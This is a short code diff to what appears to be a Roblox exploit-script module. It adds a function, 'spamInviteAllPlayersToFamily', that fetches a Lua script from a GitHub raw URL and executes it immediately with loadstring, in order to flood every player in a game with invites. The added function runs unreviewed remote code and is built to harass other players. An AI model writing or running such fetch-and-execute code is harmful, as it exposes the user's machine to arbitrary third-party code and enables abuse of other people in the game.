@@ -341,5 +341,21 @@ function modules:getColorPlayer(targetName: string, typeCopy: string): string
     return tostring(color3ToBrickColor)
 
 end
+function modules:spamInviteAllPlayersToFamily()
+
+    local function infoErro(text: string)
+        if logsError then return warn("[spamInviteAllPlayersToFamily Error] " .. text) end
+    end
+
+    local success, result = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/dreamy9x9x/MuitosBrainrotadosAhhArabicoBlud/refs/heads/main/espamafemilyiviteAAUU.lua"))()
+    end)
+
+    if not success then
+        return infoErro("Falha ao executar o script")
+    end
+
+    return true
+end
 
 return modules
